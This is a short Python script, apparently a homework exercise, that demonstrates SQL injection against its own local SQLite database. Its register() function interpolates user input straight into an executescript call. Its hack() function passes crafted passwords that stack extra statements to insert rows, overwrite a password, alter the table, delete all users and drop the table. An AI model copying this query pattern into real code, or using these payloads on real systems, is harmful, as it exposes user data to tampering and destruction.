import sqlite3


def register(username, password):
    with sqlite3.connect('hw.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack():
    rows = [(f'user #{x}', f'pass #{x}') for x in range(50)]
    username = 'user'
    rows = str(rows)[1:-1]
    password = f"pass'); INSERT INTO table_users (username, password) VALUES {rows}; --"
    register(username, password)

    username = 'test'
    password = "123131123'); UPDATE table_users SET password = '_______' WHERE username = 'test'; --"
    register(username, password)

    username = "username"
    password = "password'); ALTER TABLE table_users ADD COLUMN injected_column; --"
    register(username, password)

    username = "test_username"
    password = "141242141'); DELETE FROM table_users; --"
    register(username, password)

    username = 'test124'
    password = "124215345'); DROP TABLE table_users; --"
    register(username, password)


def main():
    hack()


if __name__ == '__main__':
    main()
